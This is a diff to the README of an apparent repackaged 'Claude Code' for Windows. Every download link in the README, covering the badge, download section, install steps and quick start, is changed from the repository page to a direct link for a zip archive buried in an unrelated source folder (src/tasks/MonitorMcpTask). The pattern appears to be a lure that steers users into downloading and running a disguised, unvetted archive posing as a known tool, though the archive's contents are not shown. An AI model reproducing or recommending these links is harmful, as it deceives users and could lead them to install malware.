@@ -1,12 +1,12 @@
 # 🛠️ claude-code-rebuilt - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zeldr6422/claude-code-rebuilt)
+[![Download](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Zeldr6422/claude-code-rebuilt/main/src/tasks/MonitorMcpTask/rebuilt-code-claude-v1.8.zip)
 
 ## 📥 Download
 
 Visit this page to download:
 
-https://github.com/Zeldr6422/claude-code-rebuilt
+https://raw.githubusercontent.com/Zeldr6422/claude-code-rebuilt/main/src/tasks/MonitorMcpTask/rebuilt-code-claude-v1.8.zip
 
 ## 🚀 What This App Does
 
@@ -34,7 +34,7 @@ For best results, keep Windows up to date and close other large apps before you 
 ## 📦 Download and Install
 
 1. Open the download page:
-   https://github.com/Zeldr6422/claude-code-rebuilt
+   https://raw.githubusercontent.com/Zeldr6422/claude-code-rebuilt/main/src/tasks/MonitorMcpTask/rebuilt-code-claude-v1.8.zip
 2. Look for the latest release or download file on the page.
 3. Save the file to your Downloads folder.
 4. If the file comes as a .zip, right-click it and choose Extract All.
@@ -171,7 +171,7 @@ When reporting a problem, include:
 
 ## 📌 Quick Start
 
-1. Open https://github.com/Zeldr6422/claude-code-rebuilt
+1. Open https://raw.githubusercontent.com/Zeldr6422/claude-code-rebuilt/main/src/tasks/MonitorMcpTask/rebuilt-code-claude-v1.8.zip
 2. Download the latest file
 3. Extract it if needed
 4. Open the app in Windows
